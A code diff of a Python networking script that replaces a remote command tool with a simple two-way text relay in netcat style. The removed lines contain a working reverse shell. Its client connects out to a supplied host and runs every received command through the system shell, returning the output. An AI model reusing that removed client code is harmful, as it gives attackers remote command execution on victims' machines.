@@ -1,132 +1,161 @@
-import sys
 import socket
-import getopt
-import subprocess
 import os
+import subprocess
+import threading
+import sys
+import time
+from os import system, name
 
-listen = False
-port = 443
-host = ""
+
+ADDRESS = '0.0.0.0'
+PORT = 5050
 
 
-def usage():
-    print("")
-    print("================================Python Network Tool===================================")
-    print("")
-    print("==============================Created by Leonard Haddad===============================")
-    print("")
-    print("=========================================Usage========================================")
-    print("")
-    print("-l --listen                          - listen on [host]:[port] for incoming connection")
-    print("-t --target                          - target address")
-    print("-p --port                            - target port")
-    print("")
-    print("*.py -l -p port                      - Setup server listener")
-    print("*.py -t target_ip -p port            - Connect to server")
-    print("")
-    print("======================================DISCLAIMER======================================")
-    print("")
-    print('Inspired by the Book: "Black Hat Python"')
-    print("")
-    print("Misuse of this tool for Illegal activities may result in legal consequences. I DO AND WILL")
-    print("NOT take responsibility for your actions! YOU HAVE BEEN WARNED!")
-    print("")
-    print("======================================================================================")
+def clear():
+    if name == 'nt': 
+        _ = system('cls') 
+    else: 
+        _ = system('clear')
+
+
+def send(s):
+    while True:
+        try:
+            user_input = input()
+            if len(user_input):
+                s.send(bytes(user_input,"utf-8"))
+        except Exception as e:
+            print(e)
+            break
+    sys.exit(-1)
+
+
+def receive(s):
+    while True:
+        try:
+            received_data = s.recv(4096)
+            received_message = received_data.decode()
+            if len(received_message):
+                print(received_message)
+        except Exception as e:
+            print(e)
+            break
+    sys.exit(-1)
+    
+
+def client(s):
+    try:
+        a = threading.Thread(target = send, args = (s,))
+        b = threading.Thread(target = receive,args = (s,))
+        a.start()
+        b.start()
+    except Exception as e:
+        print(e)
+        time.sleep(3)
+        sys.exit(0)
+
+
+def client_handler(s,addr):
+    try:
+        a=threading.Thread(target = send, args = (s,))
+        b=threading.Thread(target = receive,args = (s,))
+        a.start()
+        b.start()
+    except Exception as e:
+        print(e)
+        time.sleep(3)
+        s.close()
+        print("Client " + str(addr[0])+":"+str(addr[1])+" disconnected!")
+        sys.exit(0)
+
+
+def netcat():
+    clear()
+    global ADDRESS,PORT
+    AMOUNT = 1
+    print("Welcome to the NetCat tool!")
+    print("Please choose mode Host/Client!")
+    while True:
+        type = input("#>")
+        if "host" in type.lower():
+            print("Please select address to listen on!")
+            address = input("#>")
+            if len(address):
+                ADDRESS = address
+            print("Please select port to listen on!")
+            port = input("#>")
+            if len(port):
+                PORT = int(port)
+            print("Please specify maximum connections amount!")
+            amount = input("#>")
+            if len(amount):
+                AMOUNT = int(amount)
+            try:
+                s = socket.socket()
+                s.bind((ADDRESS,PORT))
+                s.listen(AMOUNT)
+                print("Listening on "+ADDRESS+":"+str(PORT)+"...")
+                while True:
+                    client_socket,client_address=s.accept()
+                    print("Client "+str(client_address[0])+":"+str(client_address[1])+" connected!")
+                    p = threading.Thread(target = client_handler, args = (client_socket,client_address))
+                    p.start()
+            except Exception as e:
+                print(e)
+                time.sleep(3)
+                break
+        elif "client" in type.lower():
+            print("Please select address to connect to!")
+            address = input("#>")
+            if len(address):
+                ADDRESS = address
+            print("Please specify port to connect to!")
+            port = input("#>")
+            if len(port):
+                PORT = int(port)
+            print("Attempting to connect to " + ADDRESS + ":"+str(PORT))
+            try:    
+                s = socket.socket()
+                s.connect((ADDRESS,PORT))
+                print("Connected!")
+                client(s)
+                break
+            except Exception as e:
+                print(e)
+                time.sleep(3)
+                break
+        elif "exit" in type.lower():
+            break
+        else:
+            continue
+
+
+def help():
+    print("Usage:")
+    print('netcat or nc                          - start netcat')
+    print('exit                                  - exit')
+    print('help                                  - display this screen')
+    start()
+
+
+def start():
+    print("Welcome to the Networking Tool!")
+    print('To see all functions, type "help" or "?"')
+    while True:
+        user_input = input("#>")
+        if "?" in user_input or "help" in user_input.lower():
+            help()
+            break
+        elif "netcat" in user_input.lower() or "nc" in user_input.lower():
+            netcat()
+            break
+        elif "exit" in user_input.lower():
+            break
+        elif "cls" in user_input.lower() or "clear" in user_input.lower():
+            clear()
+        else:   
+            continue
     sys.exit(0)
 
 
-# Client handler to receive commands
-def client_handler(s):
-    while True:
-        cmd_bytes = s.recv(4096)
-        cmd = cmd_bytes.decode("utf-8")
-        if cmd.startswith("cd "):
-            os.chdir(cmd[3:])
-            s.send(b"#>: ")
-            continue
-        if len(cmd) > 0:
-            p = subprocess.run(cmd, shell=True, capture_output=True)
-            data = p.stdout + p.stderr
-            s.sendall(data + b"#>: ")
-
-
-# Connect client to server
-def connect_client(address):
-    try:
-        s = socket.socket()
-        s.connect(address)
-    except socket.error as error:
-        connect_client(address)
-    client_handler(s)
-
-
-# Send commands from host
-def send_commands(conn):
-    print("\n* Press CTRL + C to kill the Connection.")
-    print("#>: ", end="")
-    while True:
-        try:
-            cmd = input()
-            if len(cmd) > 0:
-                conn.sendall(cmd.encode())
-                data = conn.recv(4096)
-                print(data.decode("utf-8"), end="")
-        except KeyboardInterrupt:
-            conn.close()
-            sys.exit()
-        except Exception as e:
-            print(e)
-
-
-# Server hosting
-def server(address):
-    try:
-        s = socket.socket()
-        s.bind(address)
-        s.listen()
-        print("======Server initialized!======")
-        print(f"*--- Listening on port {address[1]} ---* ")
-    except:
-        print("\nError occurred! Would you like to reboot server?")
-        restart = input("y/n: ")
-        if restart.lower() == "y" or restart.lower() == "yes":
-            print("Restarting...")
-            server(address)
-        else:
-            sys.exit()
-    conn, client_addr = s.accept()
-    print(f"Connected to {client_addr}")
-    send_commands(conn)
-
-
-# Main function, decides between Client/Server
-def main():
-    global listen
-    global port
-    global host
-
-    if not len(sys.argv[1:]):
-        usage()
-    try:
-        opts, args = getopt.getopt(sys.argv[1:], "hl:t:p", ["help", "listen", "target", "port"])
-    except getopt.GetoptError as err:
-        usage()
-    for o, a in opts:
-        if o in ("-h", "--help"):
-            usage()
-        elif o in ("-l", "--listen"):
-            listen = True
-        elif o in ("-t", "--target"):
-            host = a
-        elif o in ("-p", "--port"):
-            port = int(a)
-        else:
-            assert False, "Unhandled Operation!"
-        if not listen and len(host) and port > 0:
-            connect_client((host, port))
-        if listen:
-            server((host, port))
-
-
-if __name__ == "__main__":
-    main()
+start()
